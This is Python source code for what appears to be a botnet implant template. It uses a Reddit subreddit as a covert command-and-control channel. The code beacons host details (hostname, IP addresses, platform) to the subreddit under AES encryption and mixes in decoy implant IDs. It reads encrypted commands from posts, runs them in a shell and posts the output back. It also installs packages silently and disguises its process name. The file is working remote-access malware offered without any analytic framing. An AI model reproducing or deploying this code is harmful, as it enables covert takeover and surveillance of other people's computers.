#!/usr/bin/env python3
class zombie:


	def __init__(self, zid, session_key, implant_id, implant_key, account_info, subreddit):
		self.zid = zid
		self.zombie_key = session_key
		self.acc_list = account_info
		self.subreddit = subreddit
		self.implant_key = implant_key
		self.implant_id = implant_id
		

		self.hostname = socket.gethostname()
		try:
			self.publicIP = requests.get('http://ip.42.pl/raw').text
		except:
			self.publicIP = "NULL"

		self.privIP = socket.gethostbyname(self.hostname)
		self.platformInfo = platform.platform()
		self.associated_account = self.acc_list[0]

		self.conn = self.channelConnect()

	def channelConnect(self):

		reddit = praw.Reddit(	client_id = self.acc_list[3],
								client_secret = self.acc_list[2],
								password = self.acc_list[1],
								username = self.acc_list[0],
								user_agent = self.acc_list[4]
							)

		return reddit


	def encrypt(self, plaintext_data, sendReal = False):
		
		iv = buildRandom(16)
		bogusAes = buildRandom(32)
		encryptor = AES.new(self.zombie_key, AES.MODE_CFB, iv)
		rawData = encryptor.encrypt(plaintext_data)
		data = base64.b64encode(rawData).decode('utf-8')
	
		if sendReal:	
			second_encryptor = AES.new(self.implant_key, AES.MODE_CFB, iv)
			encrypted_key = second_encryptor.encrypt(self.zombie_key)
			encrypted_key_based = base64.b64encode(encrypted_key).decode('utf-8')
			enc = f"{encrypted_key_based}:{iv}:{data}"
		else:
			second_encryptor = AES.new(buildRandom(32), AES.MODE_CFB, iv)
			encrypted_bogus = second_encryptor.encrypt(bogusAes)
			encrypted_bogus_based = base64.b64encode(encrypted_bogus).decode('utf-8')
			enc = f"{encrypted_bogus_based}:{iv}:{data}"

		return enc
	
	
	def decrypt(self, enc_data):
		
		iv = enc_data.split(":")[1]
		raw_based = enc_data.split(":")[2]
		raw = base64.b64decode(raw_based)
		decryptor = AES.new(self.zombie_key, AES.MODE_CFB, iv)
		plainData = decryptor.decrypt(raw)
		return plainData.decode('utf-8')
	
	def listenForReqs(self):

		reddit = self.channelConnect()
		fullChannel = reddit.subreddit(self.subreddit)
		
		while True:

			for submission in fullChannel.new(limit=500):

				if submission.title.split(":")[0] == self.zid:
				
					if submission.title.split(":")[1] == cmd_req:
						
						# INSECURE! Will change soon.
						if len(submission.comments) == 0:

							dat = submission.selftext
							try:
								cmdData = self.decrypt(dat)
							except UnicodeDecodeError:
								pass
						
							try:
								content = cmdData.split(":::::")
								cmd_id = content[0]
								verify = content[1]
								cmd = content[2]
							except IndexError:
								pass

							if verify != channel_verify:
								#eventually will alert
								pass

							try:

								output = subprocess.check_output(cmd, shell=True)

								if len(output) == 0:
									resp = "NOOUT"

								else:
									resp = output.decode("utf-8")

								textString = self.zid + ":::::" + cmd_id + ":::::" + resp
								sendReply = self.encrypt(textString)
								post = reddit.submission(id=submission.id)

								try:
									post.reply(sendReply)
								except praw.exceptions.APIException:
									textString = self.zid + ":::::" + cmd_id + ":::::" + "TOOLONG"
									sendReply = self.encrypt(textString)
									post = reddit.submission(id=submission.id)
									post.reply(sendReply)


							except (subprocess.CalledProcessError, FileNotFoundError):
								pass


	def sendAlives(self):

		fakeImplantIDPool = [ ]
		randomizedPokeVal = random.randint(3,6)
		for i in range(random.randint(5,10)):
			fakeImplantIDPool.append(buildRandom(random.randint(8,15)))

		acknowledged = False
		pokeCount = 0
		
		reddit = self.channelConnect()
		fullChannel = reddit.subreddit(self.subreddit)
		
		while True:

			textString = "HST:" + self.hostname + ",iIP:" + self.privIP 
			textString += ",oIP:" + self.publicIP + ",PLTFRM:" + self.platformInfo
			textString += ",ACC:" + self.associated_account

			if acknowledged and pokeCount < randomizedPokeVal:
				titleString = self.zid + ":" + send_alive + ":" + fakeImplantIDPool[random.randint(0, len(fakeImplantIDPool)-1) ]
				sendDat = self.encrypt(textString)
				pokeCount += 1
			else:
				# pauses all execution until server hellos	
				self.waitForServerHello()
				titleString = self.zid + ":" + send_alive + ":" + self.implant_id
				sendDat = self.encrypt(textString, True)
				acknowledged = True	
				pokeCount = random.randint(0,3)

			fullChannel.submit(titleString, selftext=sendDat)

			time.sleep(random.randint(20,40))

	
	def waitForServerHello(self):

		fullChannel = self.conn.subreddit(self.subreddit)
		while True:

			for submission in fullChannel.new(limit=500):
				
				zid = submission.title.split(":")[0]
				action = submission.title.split(":")[1]
			
				if action == server_alive:
					
					vercodeEmbedded = submission.selftext.split(":")[2]
					vercode = ((base64.b64decode(vercodeEmbedded))[0:56]).decode("utf-8")

					if hashlib.sha224(bytes(channel_verify, 'utf-8')).hexdigest() == vercode:
						return 0

			time.sleep(random.randint(5,10))

	

def generateID():
	
	zid = "{" + buildRandom(6) + "-" + buildRandom(8) + "-" + buildRandom(3) + "-" + buildRandom(8) + "}"

	return zid


def zombInit():

	implant_id = #IMPLANT_ID
	implant_key = #IMPLANT_KEY
	accInfo = [ #USER , #PASSWORD , #SECRET , #CLIENT_ID , #AGENT ] 
	subreddit = #SUBREDDIT
	zombieID = generateID()
	session_key = buildRandom(32)
	zombObj = zombie(zombieID, session_key, implant_id, implant_key, accInfo, subreddit)
	sendAlives = multiprocessing.Process(target=zombObj.sendAlives)
	sendAlives.start()
	listen = multiprocessing.Process(target=zombObj.listenForReqs)
	listen.start()


def buildRandom(length):

	lettersAndDigits = string.ascii_letters + string.digits
	out = ''.join(random.choice(lettersAndDigits) for i in range(length))
	return out

#yeah....loud and terribly done.
def installDeps():

	install("praw")
	install("setproctitle")
	install("requests")


def install(package):
    subprocess.call([sys.executable, "-m", "pip", "install", package])


server_alive = #SERVER_ALIVE_ID
cmd_req = #COMMAND_REQUEST_ID
channel_verify = #CHANNEL_VERIFY
send_alive = #SEND_ALIVE_ID


import subprocess
import sys
import time
installDeps()
time.sleep(3)
import praw
import os
import random
import platform
import multiprocessing
import string
import socket
import requests
from Crypto.Cipher import AES
import base64
from setproctitle import setproctitle
import hashlib
setproctitle(#PROC_NAME)  
zombInit()	
